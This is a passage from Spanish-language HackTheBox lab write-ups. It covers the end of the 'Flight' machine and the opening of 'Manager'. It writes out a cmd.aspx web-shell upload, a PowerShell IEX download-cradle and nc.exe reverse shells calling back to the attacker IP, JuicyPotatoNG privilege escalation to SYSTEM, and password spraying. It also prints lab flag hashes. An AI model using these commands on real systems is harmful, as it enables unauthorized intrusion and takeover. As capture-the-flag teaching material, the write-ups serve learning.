+2023/05/06 13:38:27 server: Fingerprint B7exfu6lDGQ91lZrHuZEZoLcY1LrlI//upGOKp1smYk<span class="o">=</span>
+2023/05/06 13:38:27 server: Listening on http://0.0.0.0:1234
+2023/05/06 13:43:43 server: session#1: tun: proxy#R:8000<span class="o">=&gt;</span>8000: Listening
+
+</code></pre></div></div>
+
+<ul>
+  <li>Esto es lo que hay.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/hard/flight/web5.png" />
+</p>
+
+<ul>
+  <li>Bueno despues de enumerar tenemos capacidad de escritura en este directorio.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>icacls <span class="nb">.</span>
+<span class="nb">.</span> flight<span class="se">\C</span>.Bum:<span class="o">(</span>OI<span class="o">)(</span>CI<span class="o">)(</span>W<span class="o">)</span>
+  NT SERVICE<span class="se">\T</span>rustedInstaller:<span class="o">(</span>I<span class="o">)(</span>F<span class="o">)</span>
+  NT SERVICE<span class="se">\T</span>rustedInstaller:<span class="o">(</span>I<span class="o">)(</span>OI<span class="o">)(</span>CI<span class="o">)(</span>IO<span class="o">)(</span>F<span class="o">)</span>
+  NT AUTHORITY<span class="se">\S</span>YSTEM:<span class="o">(</span>I<span class="o">)(</span>F<span class="o">)</span>
+  NT AUTHORITY<span class="se">\S</span>YSTEM:<span class="o">(</span>I<span class="o">)(</span>OI<span class="o">)(</span>CI<span class="o">)(</span>IO<span class="o">)(</span>F<span class="o">)</span>
+  BUILTIN<span class="se">\A</span>dministrators:<span class="o">(</span>I<span class="o">)(</span>F<span class="o">)</span>
+  BUILTIN<span class="se">\A</span>dministrators:<span class="o">(</span>I<span class="o">)(</span>OI<span class="o">)(</span>CI<span class="o">)(</span>IO<span class="o">)(</span>F<span class="o">)</span>
+  BUILTIN<span class="se">\U</span>sers:<span class="o">(</span>I<span class="o">)(</span>RX<span class="o">)</span>
+  BUILTIN<span class="se">\U</span>sers:<span class="o">(</span>I<span class="o">)(</span>OI<span class="o">)(</span>CI<span class="o">)(</span>IO<span class="o">)(</span>GR,GE<span class="o">)</span>
+  CREATOR OWNER:<span class="o">(</span>I<span class="o">)(</span>OI<span class="o">)(</span>CI<span class="o">)(</span>IO<span class="o">)(</span>F<span class="o">)</span>
+
+Successfully processed 1 files<span class="p">;</span> Failed processing 0 files
+PS C:<span class="se">\i</span>netpub<span class="se">\d</span>evelopment&gt; 
+</code></pre></div></div>
+
+<ul>
+  <li>Vamos a usar una <code class="language-plaintext highlighter-rouge">cmd.aspx</code> para ganar acceso podemos usar el de <code class="language-plaintext highlighter-rouge">Seclists</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">cp</span> /usr/share/seclists/Web-Shells/FuzzDB/cmd.aspx <span class="nb">.</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Vamos a subirlo ala maquina victima.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>certutil.exe <span class="nt">-urlcache</span> <span class="nt">-f</span> <span class="nt">-split</span> http://10.10.14.86/cmd.aspx
+</code></pre></div></div>
+
+<ul>
+  <li>Funciona.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/hard/flight/web6.png" />
+</p>
+
+<ul>
+  <li>Nos podemos en escucha con <code class="language-plaintext highlighter-rouge">rlwrap</code> para ganar acceso.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ rlwrap nc <span class="nt">-lvnp</span> 443
+listening on <span class="o">[</span>any] 443 ...
+</code></pre></div></div>
+
+<ul>
+  <li>Ejecutamos este comando para ganar acceso en el <strong>cmd.aspx</strong> vamos a reutilizar el script <code class="language-plaintext highlighter-rouge">sh.ps1</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cmd /c powershell IEX<span class="o">(</span>New-Object Net.WebClient<span class="o">)</span>.downloadString<span class="o">(</span><span class="s1">'http://10.10.14.86/sh.ps1'</span><span class="o">)</span>
+</code></pre></div></div>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/hard/flight/web7.png" />
+</p>
+
+<p>Ganamos acceso</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ rlwrap nc <span class="nt">-lvnp</span> 443
+listening on <span class="o">[</span>any] 443 ...
+connect to <span class="o">[</span>10.10.14.86] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.187] 55818
+Windows PowerShell running as user G0<span class="nv">$ </span>on G0
+Copyright <span class="o">(</span>C<span class="o">)</span> 2015 Microsoft Corporation. All rights reserved.
+
+<span class="nb">whoami
+</span>iis apppool<span class="se">\d</span>efaultapppool
+PS C:<span class="se">\w</span>indows<span class="se">\s</span>ystem32<span class="se">\i</span>netsrv&gt; 
+
+</code></pre></div></div>
+
+<h2 id="escalada-de-privilegios">Escalada de privilegios</h2>
+
+<ul>
+  <li>Como el <strong>SeImpersonatePrivilege</strong> esta en enable podemos usar el <code class="language-plaintext highlighter-rouge">JuicyPotato</code> para escalar privilegios.</li>
+</ul>
+
+<p><a href="https://github.com/antonioCoco/JuicyPotatoNG/releases/tag/v1.1">https://github.com/antonioCoco/JuicyPotatoNG/releases/tag/v1.1</a></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">whoami</span> /priv
+
+PRIVILEGES INFORMATION
+<span class="nt">----------------------</span>
+
+Privilege Name                Description                               State   
+<span class="o">=============================</span> <span class="o">=========================================</span> <span class="o">========</span>
+SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
+SeIncreaseQuotaPrivilege      Adjust memory quotas <span class="k">for </span>a process        Disabled
+SeMachineAccountPrivilege     Add workstations to domain                Disabled
+SeAuditPrivilege              Generate security audits                  Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
+SeCreateGlobalPrivilege       Create global objects                     Enabled 
+SeIncreaseWorkingSetPrivilege Increase a process working <span class="nb">set            </span>Disabled
+PS C:<span class="se">\w</span>indows<span class="se">\s</span>ystem32<span class="se">\i</span>netsrv&gt; 
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ unzip JuicyPotatoNG.zip
+Archive:  JuicyPotatoNG.zip
+  inflating: JuicyPotatoNG.exe   
+</code></pre></div></div>
+
+<ul>
+  <li>Vamos a subirlo a la maquina victima.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cd </span>C:<span class="se">\t</span>emp
+certutil.exe <span class="nt">-urlcache</span> <span class="nt">-f</span> <span class="nt">-split</span> http://10.10.14.86/JuicyPotatoNG.exe
+<span class="k">****</span>  Online  <span class="k">****</span>
+  000000  ...
+  025800
+CertUtil: <span class="nt">-URLCache</span> <span class="nb">command </span>completed successfully.
+PS C:<span class="se">\t</span>emp&gt; 
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora tambien necesitamos el <code class="language-plaintext highlighter-rouge">netcat</code> podemos usar el que trae <strong>Seclists</strong>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">cp</span> /usr/share/seclists/Web-Shells/FuzzDB/nc.exe <span class="nb">.</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Lo subimos ala maquina victima.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>certutil.exe <span class="nt">-urlcache</span> <span class="nt">-f</span> <span class="nt">-split</span> http://10.10.14.86/nc.exe
+<span class="k">****</span>  Online  <span class="k">****</span>
+  0000  ...
+  6e00
+CertUtil: <span class="nt">-URLCache</span> <span class="nb">command </span>completed successfully.
+PS C:<span class="se">\t</span>emp&gt; 
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora nos pondremos en escucha para ganar accesos como el usuario <code class="language-plaintext highlighter-rouge">nt authority\system</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./JuicyPotatoNG.exe <span class="nt">-t</span> <span class="k">*</span> <span class="nt">-p</span> <span class="s2">"C:</span><span class="se">\t</span><span class="s2">emp</span><span class="se">\n</span><span class="s2">c.exe"</span> <span class="nt">-a</span> <span class="s1">'10.10.14.86 443 -e cmd'</span>
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ rlwrap nc <span class="nt">-lvnp</span> 443
+listening on <span class="o">[</span>any] 443 ...
+connect to <span class="o">[</span>10.10.14.86] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.187] 55848
+Microsoft Windows <span class="o">[</span>Version 10.0.17763.2989]
+<span class="o">(</span>c<span class="o">)</span> 2018 Microsoft Corporation. All rights reserved.
+
+<span class="nb">whoami
+whoami
+</span>nt authority<span class="se">\s</span>ystem
+
+C:<span class="se">\&gt;</span>
+
+
+</code></pre></div></div>
+
+<h2 id="root-flag">Root flag</h2>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> Directory of C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop
+
+09/22/2022  01:48 PM    &lt;DIR&gt;          <span class="nb">.</span>
+09/22/2022  01:48 PM    &lt;DIR&gt;          ..
+05/05/2023  05:38 AM                34 root.txt
+               1 File<span class="o">(</span>s<span class="o">)</span>             34 bytes
+               2 Dir<span class="o">(</span>s<span class="o">)</span>   4,735,803,392 bytes free
+
+<span class="nb">type </span>root.txt
+<span class="nb">type </span>root.txt
+7331258631d8c7440a99b334890f914c
+
+C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop&gt;
+</code></pre></div></div>
+
+<h2 id="usertxt">User.txt</h2>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">dir</span> /r /s user.txt
+ Volume <span class="k">in </span>drive C has no label.
+ Volume Serial Number is 1DF4-493D
+
+ Directory of C:<span class="se">\D</span>ocuments and Settings<span class="se">\C</span>.Bum<span class="se">\D</span>esktop
+
+05/05/2023  05:38 AM                34 user.txt
+               1 File<span class="o">(</span>s<span class="o">)</span>             34 bytes
+
+ Directory of C:<span class="se">\U</span>sers<span class="se">\C</span>.Bum<span class="se">\D</span>esktop
+
+05/05/2023  05:38 AM                34 user.txt
+               1 File<span class="o">(</span>s<span class="o">)</span>             34 bytes
+
+     Total Files Listed:
+               2 File<span class="o">(</span>s<span class="o">)</span>             68 bytes
+               0 Dir<span class="o">(</span>s<span class="o">)</span>   4,735,803,392 bytes free
+
+C:<span class="se">\&gt;</span>
+
+<span class="nb">type </span>C:<span class="se">\U</span>sers<span class="se">\C</span>.Bum<span class="se">\D</span>esktop<span class="se">\u</span>ser.txt
+<span class="nb">type </span>C:<span class="se">\U</span>sers<span class="se">\C</span>.Bum<span class="se">\D</span>esktop<span class="se">\u</span>ser.txt
+a39c9d5f10510d2133ed1b2ed5dda547
+
+C:<span class="se">\&gt;</span>
+</code></pre></div></div>]]></content><author><name>MiguelRega7</name></author><category term="hackthebox/machines/hard" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">HackTheBox - Manager (medium)</title><link href="http://localhost:4000/hackthebox/machines/medium/2024/04/05/manager.html" rel="alternate" type="text/html" title="HackTheBox - Manager (medium)" /><published>2024-04-05T00:00:00-06:00</published><updated>2024-04-05T00:00:00-06:00</updated><id>http://localhost:4000/hackthebox/machines/medium/2024/04/05/manager</id><content type="html" xml:base="http://localhost:4000/hackthebox/machines/medium/2024/04/05/manager.html"><![CDATA[<p align="center">
+<img src="https://labs.hackthebox.com/storage/avatars/5ca8f0c721a9eca6f1aeb9ff4b4bac60.png" />
+</p>
+
+<ul>
+  <li>Manager es una máquina Windows de dificultad media que alberga un entorno de Active Directory con AD CS (Active Directory Certificate Services), un servidor web y un servidor SQL. El punto de entrada implica enumerar usuarios utilizando RID cycling y realizar un ataque de contraseña para acceder al servicio MSSQL. Luego, se utiliza el procedimiento xp_dirtree para explorar el sistema de archivos, descubriendo una copia de seguridad del sitio web en la raíz del servidor web. Extrayendo la copia de seguridad se revelan credenciales que se reutilizan para conectarse a través de WinRM al servidor. Finalmente, el atacante escala privilegios a través de AD CS mediante la explotación de ESC7.</li>
+</ul>
+
+<h2 id="portscan">PortScan</h2>
+
+<ul>
+  <li>Comenzamos escaneando los puertos abiertos por el protocolo <strong>TCP</strong>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap <span class="nb">sudo </span>nmap <span class="nt">-sCV</span> <span class="nt">-p53</span>,80,88,135,139,389,445,464,593,636,1433,3268,3269,5985,9389,49667,49669,49670,49671,49721,56310,60346 10.10.11.236 <span class="nt">-oN</span> targeted
+Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-03-16 11:44 CST
+Nmap scan report <span class="k">for </span>10.10.11.236
+Host is up <span class="o">(</span>0.17s latency<span class="o">)</span><span class="nb">.</span>
+
+PORT      STATE    SERVICE       VERSION
+53/tcp    open     domain        Simple DNS Plus
+80/tcp    open     http          Microsoft IIS httpd 10.0
+| http-methods:
+|_  Potentially risky methods: TRACE
+|_http-title: Manager
+88/tcp    open     kerberos-sec  Microsoft Windows Kerberos <span class="o">(</span>server <span class="nb">time</span>: 2024-03-17 00:45:13Z<span class="o">)</span>
+135/tcp   open     msrpc         Microsoft Windows RPC
+139/tcp   open     netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open     ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: manager.htb0., Site: Default-First-Site-Name<span class="o">)</span>
+| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>dc01.manager.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc01.manager.htb
+| Not valid before: 2023-07-30T13:51:28
+|_Not valid after:  2024-07-29T13:51:28
+|_ssl-date: 2024-03-17T00:46:50+00:00<span class="p">;</span> +7h00m01s from scanner time.
+445/tcp   open     microsoft-ds?
+464/tcp   open     kpasswd5?
+593/tcp   open     ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open     ssl/ldap      Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: manager.htb0., Site: Default-First-Site-Name<span class="o">)</span>
+| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>dc01.manager.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc01.manager.htb
+| Not valid before: 2023-07-30T13:51:28
+|_Not valid after:  2024-07-29T13:51:28
+|_ssl-date: 2024-03-17T00:46:48+00:00<span class="p">;</span> +7h00m01s from scanner time.
+1433/tcp  open     ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00<span class="p">;</span> RTM
+| ms-sql-ntlm-info:
+|   10.10.11.236:1433:
+|     Target_Name: MANAGER
+|     NetBIOS_Domain_Name: MANAGER
+|     NetBIOS_Computer_Name: DC01
+|     DNS_Domain_Name: manager.htb
+|     DNS_Computer_Name: dc01.manager.htb
+|     DNS_Tree_Name: manager.htb
+|_    Product_Version: 10.0.17763
+| ms-sql-info:
+|   10.10.11.236:1433:
+|     Version:
+|       name: Microsoft SQL Server 2019 RTM
+|       number: 15.00.2000.00
+|       Product: Microsoft SQL Server 2019
+|       Service pack level: RTM
+|       Post-SP patches applied: <span class="nb">false</span>
+|_    TCP port: 1433
+|_ssl-date: 2024-03-17T00:46:50+00:00<span class="p">;</span> +7h00m01s from scanner time.
+| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>SSL_Self_Signed_Fallback
+| Not valid before: 2024-03-15T21:10:24
+|_Not valid after:  2054-03-15T21:10:24
+3268/tcp  open     ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: manager.htb0., Site: Default-First-Site-Name<span class="o">)</span>
+|_ssl-date: 2024-03-17T00:46:50+00:00<span class="p">;</span> +7h00m01s from scanner time.
+| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>dc01.manager.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc01.manager.htb
+| Not valid before: 2023-07-30T13:51:28
+|_Not valid after:  2024-07-29T13:51:28
+3269/tcp  open     ssl/ldap      Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: manager.htb0., Site: Default-First-Site-Name<span class="o">)</span>
+|_ssl-date: 2024-03-17T00:46:48+00:00<span class="p">;</span> +7h00m01s from scanner time.
+| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>dc01.manager.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc01.manager.htb
+| Not valid before: 2023-07-30T13:51:28
+|_Not valid after:  2024-07-29T13:51:28
+5985/tcp  open     http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
+|_http-title: Not Found
+9389/tcp  open     mc-nmf        .NET Message Framing
+49667/tcp open     msrpc         Microsoft Windows RPC
+49669/tcp open     ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49670/tcp open     msrpc         Microsoft Windows RPC
+49671/tcp open     msrpc         Microsoft Windows RPC
+49721/tcp open     msrpc         Microsoft Windows RPC
+56310/tcp filtered unknown
+60346/tcp open     msrpc         Microsoft Windows RPC
+Service Info: Host: DC01<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: 7h00m00s, deviation: 0s, median: 7h00m00s
+| smb2-time:
+|   <span class="nb">date</span>: 2024-03-17T00:46:08
+|_  start_date: N/A
+| smb2-security-mode:
+|   3:1:1:
+|_    Message signing enabled and required
+</code></pre></div></div>
+
+<h2 id="enumeración-de-usuarios">Enumeración de usuarios</h2>
+
+<ul>
+  <li>Bueno primero vamos a agregar los dominios que tenemos al archivo <strong>/etc/hosts</strong>*.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap <span class="nb">echo</span> <span class="s2">"10.10.11.236 dc01.manager.htb manager.htb"</span> | <span class="nb">sudo tee</span> <span class="nt">-a</span> /etc/hosts
+10.10.11.236 dc01.manager.htb manager.htb
+</code></pre></div></div>
+
+<ul>
+  <li>Estamos ante un <strong>Windows 10</strong>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap crackmapexec smb 10.10.11.236
+SMB         10.10.11.236    445    DC01             <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:DC01<span class="o">)</span> <span class="o">(</span>domain:manager.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+</code></pre></div></div>
+
+<ul>
+  <li>
+    <p>Vamos a comenzar enumerando por el protocolo <strong>smb</strong> para ver si podemos ver recursos compartidos.</p>
+  </li>
+  <li>
+    <p>Solo vemos esto.</p>
+  </li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap crackmapexec smb 10.10.11.236 <span class="nt">-u</span> <span class="s2">"miguel"</span> <span class="nt">-p</span> <span class="s2">""</span> <span class="nt">--shares</span>
+SMB         10.10.11.236    445    DC01             <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:DC01<span class="o">)</span> <span class="o">(</span>domain:manager.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+SMB         10.10.11.236    445    DC01             <span class="o">[</span>+] manager.htb<span class="se">\m</span>iguel:
+SMB         10.10.11.236    445    DC01             <span class="o">[</span>+] Enumerated shares
+SMB         10.10.11.236    445    DC01             Share           Permissions     Remark
+SMB         10.10.11.236    445    DC01             <span class="nt">-----</span>           <span class="nt">-----------</span>     <span class="nt">------</span>
+SMB         10.10.11.236    445    DC01             ADMIN<span class="nv">$ </span>                         Remote Admin
+SMB         10.10.11.236    445    DC01             C<span class="nv">$ </span>                             Default share
+SMB         10.10.11.236    445    DC01             IPC<span class="nv">$ </span>           READ            Remote IPC
+SMB         10.10.11.236    445    DC01             NETLOGON                        Logon server share
+SMB         10.10.11.236    445    DC01             SYSVOL                          Logon server share
+➜  nmap
+</code></pre></div></div>
+
+<ul>
+  <li>Podemos enumerar usuarios tanto por <strong>kerberos</strong> y con <strong>crackmapexec</strong> vamos a usar <strong>kerberos</strong> primero.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content ./kerbrute userenum <span class="nt">-d</span> manager.htb /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt <span class="nt">--dc</span> dc01.manager.htb
+
+    __             __               __
+   / /_____  _____/ /_  _______  __/ /____
+  / //_/ _ <span class="se">\/</span> ___/ __ <span class="se">\/</span> ___/ / / / __/ _ <span class="se">\</span>
+ / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|<span class="se">\_</span>__/_/  /_.___/_/   <span class="se">\_</span>_,_/<span class="se">\_</span>_/<span class="se">\_</span>__/
+
+Version: v1.0.3 <span class="o">(</span>9dad6e1<span class="o">)</span> - 03/16/24 - Ronnie Flathers @ropnop
+
+2024/03/16 12:01:09 <span class="o">&gt;</span>  Using KDC<span class="o">(</span>s<span class="o">)</span>:
+2024/03/16 12:01:09 <span class="o">&gt;</span>  	dc01.manager.htb:88
+
+2024/03/16 12:01:12 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 ryan@manager.htb
+2024/03/16 12:01:18 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 guest@manager.htb
+2024/03/16 12:01:21 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 cheng@manager.htb
+2024/03/16 12:01:23 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 raven@manager.htb
+2024/03/16 12:01:38 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 administrator@manager.htb
+2024/03/16 12:02:12 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 Ryan@manager.htb
+2024/03/16 12:02:19 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 Raven@manager.htb
+2024/03/16 12:02:37 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 operator@manager.htb
+</code></pre></div></div>
+
+<ul>
+  <li>Y bueno tenemos usuarios lo que podemos hacer ahora es un <strong>Password Spraying</strong> para ver si algun usuario usa su nombre de usuario como contraseña.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content crackmapexec smb 10.10.11.236 <span class="nt">-u</span> list.txt <span class="nt">-p</span> list.txt <span class="nt">--no-brute</span> <span class="nt">--continue-on-success</span>
+SMB         10.10.11.236    445    DC01             <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:DC01<span class="o">)</span> <span class="o">(</span>domain:manager.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+SMB         10.10.11.236    445    DC01             <span class="o">[</span>-] manager.htb<span class="se">\r</span>yan:ryan STATUS_LOGON_FAILURE
+SMB         10.10.11.236    445    DC01             <span class="o">[</span>-] manager.htb<span class="se">\g</span>uest:guest STATUS_LOGON_FAILURE
+SMB         10.10.11.236    445    DC01             <span class="o">[</span>-] manager.htb<span class="se">\c</span>heng:cheng STATUS_LOGON_FAILURE
+SMB         10.10.11.236    445    DC01             <span class="o">[</span>-] manager.htb<span class="se">\r</span>aven:raven STATUS_LOGON_FAILURE
+SMB         10.10.11.236    445    DC01             <span class="o">[</span>-] manager.htb<span class="se">\a</span>dministrator:administrator STATUS_LOGON_FAILURE
+SMB         10.10.11.236    445    DC01             <span class="o">[</span>-] manager.htb<span class="se">\r</span>yan:ryan STATUS_LOGON_FAILURE
+SMB         10.10.11.236    445    DC01             <span class="o">[</span>-] manager.htb<span class="se">\r</span>aven:raven STATUS_LOGON_FAILURE
+SMB         10.10.11.236    445    DC01             <span class="o">[</span>+] manager.htb<span class="se">\o</span>perator:operator
+</code></pre></div></div>
+
+<ul>
+  <li>Y bueno con esto sabemos que el usuario <strong>operator:operator</strong> son sus credenciales, pero si revisamos no podemos usar <strong>evil-winrm</strong> para conectarnos ala máquina.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content crackmapexec winrm 10.10.11.236 <span class="nt">-u</span> <span class="s2">"operator"</span> <span class="nt">-p</span> <span class="s2">"operator"</span>
+SMB         10.10.11.236    5985   DC01             <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 <span class="o">(</span>name:DC01<span class="o">)</span> <span class="o">(</span>domain:manager.htb<span class="o">)</span>
+HTTP        10.10.11.236    5985   DC01             <span class="o">[</span><span class="k">*</span><span class="o">]</span> http://10.10.11.236:5985/wsman
+WINRM       10.10.11.236    5985   DC01             <span class="o">[</span>-] manager.htb<span class="se">\o</span>perator:operator
+</code></pre></div></div>
+
+<ul>
+  <li>Tenemos privilegios de lectura en esos directorios.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content crackmapexec smb 10.10.11.236 <span class="nt">-u</span> <span class="s2">"operator"</span> <span class="nt">-p</span> <span class="s2">"operator"</span> <span class="nt">--shares</span>
+SMB         10.10.11.236    445    DC01             <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:DC01<span class="o">)</span> <span class="o">(</span>domain:manager.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+SMB         10.10.11.236    445    DC01             <span class="o">[</span>+] manager.htb<span class="se">\o</span>perator:operator
+SMB         10.10.11.236    445    DC01             <span class="o">[</span>+] Enumerated shares
+SMB         10.10.11.236    445    DC01             Share           Permissions     Remark
+SMB         10.10.11.236    445    DC01             <span class="nt">-----</span>           <span class="nt">-----------</span>     <span class="nt">------</span>
+SMB         10.10.11.236    445    DC01             ADMIN<span class="nv">$ </span>                         Remote Admin
+SMB         10.10.11.236    445    DC01             C<span class="nv">$ </span>                             Default share
+SMB         10.10.11.236    445    DC01             IPC<span class="nv">$ </span>           READ            Remote IPC
+SMB         10.10.11.236    445    DC01             NETLOGON        READ            Logon server share
+SMB         10.10.11.236    445    DC01             SYSVOL          READ            Logon server share
+</code></pre></div></div>
+
+<h2 id="mssql">MSSQL</h2>
+
+<ul>
+  <li>Si recordamos tenemos este puerto abierto.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1433/tcp  open     ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00<span class="p">;</span> RTM
+| ms-sql-ntlm-info:
+|   10.10.11.236:1433:
+|     Target_Name: MANAGER
+|     NetBIOS_Domain_Name: MANAGER
+|     NetBIOS_Computer_Name: DC01
+|     DNS_Domain_Name: manager.htb
+|     DNS_Computer_Name: dc01.manager.htb
+|     DNS_Tree_Name: manager.htb
+|_    Product_Version: 10.0.17763
+| ms-sql-info:
+|   10.10.11.236:1433:
+|     Version:
+|       name: Microsoft SQL Server 2019 RTM
+|       number: 15.00.2000.00
+|       Product: Microsoft SQL Server 2019
+|       Service pack level: RTM
+|       Post-SP patches applied: <span class="nb">false</span>
+|_    TCP port: 1433
+|_ssl-date: 2024-03-17T00:46:50+00:00<span class="p">;</span> +7h00m01s from scanner time.
+| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>SSL_Self_Signed_Fallback
+| Not valid before: 2024-03-15T21:10:24
+|_Not valid after:  2054-03-15T21:10:24
+</code></pre></div></div>
+
+<ul>
+  <li>Podemos ver si nuestro usuario es válido para usar ese servicio.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content crackmapexec mssql 10.10.11.236 <span class="nt">-u</span> <span class="s2">"operator"</span> <span class="nt">-p</span> <span class="s2">"operator"</span>
+MSSQL       10.10.11.236    1433   DC01             <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 <span class="o">(</span>name:DC01<span class="o">)</span> <span class="o">(</span>domain:manager.htb<span class="o">)</span>
+MSSQL       10.10.11.236    1433   DC01             <span class="o">[</span>+] manager.htb<span class="se">\o</span>perator:operator
+</code></pre></div></div>
+
+<ul>
+  <li>Sabiendo esto podemos usar <strong>impacket-mssqlclient</strong> para conectarnos.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content impacket-mssqlclient <span class="nt">-port</span> 1433 10.10.11.236/operator:operator@10.10.11.236 <span class="nt">-window</span>
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Encryption required, switching to TLS
